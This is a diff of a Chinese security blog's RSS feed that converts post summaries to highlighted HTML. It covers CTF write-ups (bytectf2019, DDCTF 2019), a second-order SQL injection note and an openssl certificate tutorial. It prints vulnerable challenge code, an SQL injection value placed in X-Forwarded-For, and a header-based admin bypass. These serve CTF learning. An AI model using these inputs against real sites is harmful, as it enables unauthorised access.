--&amp;gt;&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;解法:&lt;/p&gt;
+&lt;p&gt;先用&lt;code&gt;1&#39;|1|&#39;1&lt;/code&gt;作为xff访问网站网站 , 访问成功之后改变xff, 再次访问, 这个时候由于前后xff不一致, 原来存储进数据库currentip的ip被重新提取出来存进lastip项中, 如果这个lastip没有过滤的话,就可以造成&lt;strong&gt;二次注入&lt;/strong&gt;, 事实上也确实如此, 但这个可能得猜&amp;hellip;&amp;hellip;在第二次访问之后, payload被重新插入进数据库中, 带着第二次访问的xff来第三次访问这个网站,可以看到&lt;/p&gt;</description>
     </item>
     <item>
       <title>bytectf2019</title>
       <link>https://ch3n9w.github.io/posts/ctf-bytectf2019/</link>
       <pubDate>Mon, 09 Sep 2019 08:18:25 +0000</pubDate>
       <guid>https://ch3n9w.github.io/posts/ctf-bytectf2019/</guid>
-      <description>boring code source code
-&amp;lt;?php function is_valid_url($url) { if (filter_var($url, FILTER_VALIDATE_URL)) { if (preg_match(&amp;#39;/data:\/\//i&amp;#39;, $url)) { return false; } return true; } return false; } if (isset($_POST[&amp;#39;url&amp;#39;])){ $url = $_POST[&amp;#39;url&amp;#39;]; if (is_valid_url($url)) { $r = parse_url($url); if (preg_match(&amp;#39;/baidu\.com$/&amp;#39;, $r[&amp;#39;host&amp;#39;])) { $code = file_get_contents($url); if (&amp;#39;;&amp;#39; === preg_replace(&amp;#39;/[a-z]+\((?R)?\)/&amp;#39;, NULL, $code)) { if (preg_match(&amp;#39;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&amp;#39;, $code)) { echo &amp;#39;bye~&amp;#39;; } else { eval($code); } } } else { echo &amp;#34;error: host not allowed&amp;#34;; } } else { echo &amp;#34;error: invalid url&amp;#34;; } }else{ highlight_file(__FILE__); } 思路: 注册一个xxxxbaidu.</description>
+      <description>&lt;h2 id=&#34;boring-code&#34;&gt;boring code&lt;/h2&gt;
+&lt;p&gt;source code&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;is_valid_url&lt;/span&gt;($url) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;filter_var&lt;/span&gt;($url, &lt;span style=&#34;color:#a6e22e&#34;&gt;FILTER_VALIDATE_URL&lt;/span&gt;)) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;preg_match&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/data:\/\//i&amp;#39;&lt;/span&gt;, $url)) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;isset&lt;/span&gt;($_POST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;url&amp;#39;&lt;/span&gt;])){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    $url &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_POST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;url&amp;#39;&lt;/span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;is_valid_url&lt;/span&gt;($url)) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        $r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;parse_url&lt;/span&gt;($url);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;preg_match&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/baidu\.com$/&amp;#39;&lt;/span&gt;, $r[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;host&amp;#39;&lt;/span&gt;])) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            $code &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;file_get_contents&lt;/span&gt;($url);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;===&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;preg_replace&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/[a-z]+\((?R)?\)/&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;NULL&lt;/span&gt;, $code)) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;preg_match&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&amp;#39;&lt;/span&gt;, $code)) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;bye~&amp;#39;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    &lt;span style=&#34;color:#66d9ef&#34;&gt;eval&lt;/span&gt;($code);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;error: host not allowed&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;error: invalid url&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;highlight_file&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;__FILE__&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;思路: 注册一个xxxxbaidu.com 形式的域名.绑定到服务器上后放上自己的代码,payload&lt;/p&gt;</description>
     </item>
     <item>
       <title>php session反序列化</title>
@@ -505,16 +846,30 @@ $result = query(&amp;#34;select current_ip, last_ip from ip_log where uuid = &am
       <link>https://ch3n9w.github.io/posts/tech-openssl/</link>
       <pubDate>Sun, 01 Sep 2019 15:23:10 +0000</pubDate>
       <guid>https://ch3n9w.github.io/posts/tech-openssl/</guid>
-      <description>来看看互联网世界的基石
-通信过程的简化模型 第一阶段: 服务器向CA发起证书签名请求 服务器组织生成一个私钥
-openssl genrsa -out target.key 1024 从私钥文件中得到公钥, 这个公钥会被用于给CA签名
-openssl rsa -in target.key -pubout -out target_pub.key 使用私钥生成一个证书签名请求, 在生成过程中需要填写证书申请人的一些信息
-openssl req -new -key target.key -out target.csr 生成完成后, 可以运行下面命令看看这个证书签名请求文件里都有什么
-openssl req -text -in target.csr -verify 例如:
-可以看到公钥也在里面.
-接下来把证书签名请求文件提交给CA, CA审核通过后对该文件进行签名
-openssl x509 -in target.csr -out target.crt -req -signkey ca.key -days 365 target.crt就是签名成功后的证书. 对于常见的自签名场景来说, ca.key就是target.key, 用自己的密钥去签名自己的证书请求, 自签名请求命令就是
-openssl x509 -in target.csr -out target.crt -req -signkey target.key -days 365 然后CA将target.crt以及由Root CA签名的CA证书一同返回给申请人. 如下图所示:</description>
+      <description>&lt;blockquote&gt;
+&lt;p&gt;来看看互联网世界的基石&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;通信过程的简化模型&#34;&gt;通信过程的简化模型&lt;/h2&gt;
+&lt;h3 id=&#34;第一阶段-服务器向ca发起证书签名请求&#34;&gt;第一阶段: 服务器向CA发起证书签名请求&lt;/h3&gt;
+&lt;p&gt;服务器组织生成一个私钥&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;openssl genrsa -out target.key &lt;span style=&#34;color:#ae81ff&#34;&gt;1024&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;从私钥文件中得到公钥, 这个公钥会被用于给CA签名&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;openssl rsa -in target.key -pubout -out target_pub.key
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;使用私钥生成一个证书签名请求, 在生成过程中需要填写证书申请人的一些信息&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;openssl req -new -key target.key -out target.csr
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;生成完成后, 可以运行下面命令看看这个证书签名请求文件里都有什么&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;openssl req -text -in target.csr  -verify
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;例如:&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;image-20221223112026855.png&#34; alt=&#34;image-20221223112026855&#34;  /&gt;
+&lt;/p&gt;
+&lt;p&gt;可以看到公钥也在里面.&lt;/p&gt;
+&lt;p&gt;接下来把证书签名请求文件提交给CA, CA审核通过后对该文件进行签名&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;openssl x509 -in target.csr -out target.crt -req -signkey ca.key -days &lt;span style=&#34;color:#ae81ff&#34;&gt;365&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;target.crt就是签名成功后的证书. 对于常见的自签名场景来说, &lt;code&gt;ca.key&lt;/code&gt;就是&lt;code&gt;target.key&lt;/code&gt;, 用自己的密钥去签名自己的证书请求, 自签名请求命令就是&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;openssl x509 -in target.csr -out target.crt -req -signkey target.key -days &lt;span style=&#34;color:#ae81ff&#34;&gt;365&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后CA将target.crt以及由Root CA签名的CA证书一同返回给申请人. 如下图所示:&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;19QiVdLVN-6NCQPy7Zla1BA.jpeg&#34; alt=&#34;img&#34;  /&gt;
+&lt;/p&gt;</description>
     </item>
     <item>
       <title>Google_Game</title>
@@ -528,10 +883,176 @@ openssl x509 -in target.csr -out target.crt -req -signkey target.key -days 365 �
       <link>https://ch3n9w.github.io/posts/ctf-2019-ddctf-web/</link>
       <pubDate>Sat, 11 May 2019 13:58:05 +0000</pubDate>
       <guid>https://ch3n9w.github.io/posts/ctf-2019-ddctf-web/</guid>
-      <description>考试周结束，有时间来复现了。。。然鹅好像有题目崩了，java又没学过。。。只能复现一部分了。
-web 签到题 点击，扫描，发现除了index.php 之外其他都需要登陆，抓包发现有发送Auth.php请求，其中有didictf_username字段，尝试添加成为didictf_username: admin。成功登陆。
-然后在返回包中显示出了一个php文件，尝试访问看到了Session.php的源代码如下：
-&amp;lt;?php Class Application { var $path = &amp;#39;&amp;#39;; public function response($data, $errMsg = &amp;#39;success&amp;#39;) { $ret = [&amp;#39;errMsg&amp;#39; =&amp;gt; $errMsg, &amp;#39;data&amp;#39; =&amp;gt; $data]; $ret = json_encode($ret); header(&amp;#39;Content-type: application/json&amp;#39;); echo $ret; } public function auth() { $DIDICTF_ADMIN = &amp;#39;admin&amp;#39;; if(!empty($_SERVER[&amp;#39;HTTP_DIDICTF_USERNAME&amp;#39;]) &amp;amp;&amp;amp; $_SERVER[&amp;#39;HTTP_DIDICTF_USERNAME&amp;#39;] == $DIDICTF_ADMIN) { $this-&amp;gt;response(&amp;#39;您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php&amp;#39;); return TRUE; }else{ $this-&amp;gt;response(&amp;#39;抱歉，您没有登陆权限，请获取权限后访问-----&amp;#39;,&amp;#39;error&amp;#39;); exit(); } } private function sanitizepath($path) { $path = trim($path);//去掉空格 $path=str_replace(&amp;#39;../&amp;#39;,&amp;#39;&amp;#39;,$path);//过滤第一 $path=str_replace(&amp;#39;..\\&amp;#39;,&amp;#39;&amp;#39;,$path);//过滤第二 return $path; }// public function __destruct() { if(empty($this-&amp;gt;path)) { exit(); }else{ $path = $this-&amp;gt;sanitizepath($this-&amp;gt;path);// .</description>
+      <description>&lt;p&gt;考试周结束，有时间来复现了。。。然鹅好像有题目崩了，java又没学过。。。只能复现一部分了。&lt;/p&gt;
+&lt;h2 id=&#34;web-签到题&#34;&gt;web 签到题&lt;/h2&gt;
+&lt;p&gt;点击，扫描，发现除了index.php 之外其他都需要登陆，抓包发现有发送&lt;code&gt;Auth.php&lt;/code&gt;请求，其中有&lt;code&gt;didictf_username&lt;/code&gt;字段，尝试添加成为&lt;code&gt;didictf_username: admin&lt;/code&gt;。成功登陆。&lt;/p&gt;
+&lt;p&gt;然后在返回包中显示出了一个&lt;code&gt;php文件&lt;/code&gt;，尝试访问看到了&lt;code&gt;Session.php&lt;/code&gt;的源代码如下：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Application&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; $path &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;response&lt;/span&gt;($data, $errMsg &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;success&amp;#39;&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      $ret &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;errMsg&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; $errMsg,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;data&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; $data];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      $ret &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;json_encode&lt;/span&gt;($ret);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#a6e22e&#34;&gt;header&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Content-type: application/json&amp;#39;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; $ret;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;auth&lt;/span&gt;() {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      $DIDICTF_ADMIN &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;admin&amp;#39;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;empty&lt;/span&gt;($_SERVER[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;HTTP_DIDICTF_USERNAME&amp;#39;&lt;/span&gt;]) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; $_SERVER[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;HTTP_DIDICTF_USERNAME&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; $DIDICTF_ADMIN) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;response&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php&amp;#39;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;TRUE&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      }&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;response&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;抱歉，您没有登陆权限，请获取权限后访问-----&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;error&amp;#39;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          &lt;span style=&#34;color:#66d9ef&#34;&gt;exit&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sanitizepath&lt;/span&gt;($path) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  $path &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;trim&lt;/span&gt;($path);&lt;span style=&#34;color:#75715e&#34;&gt;//去掉空格
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  $path&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;str_replace&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;../&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;,$path);&lt;span style=&#34;color:#75715e&#34;&gt;//过滤第一
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  $path&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;str_replace&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;..\\&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;,$path);&lt;span style=&#34;color:#75715e&#34;&gt;//过滤第二
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; $path;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}&lt;span style=&#34;color:#75715e&#34;&gt;//
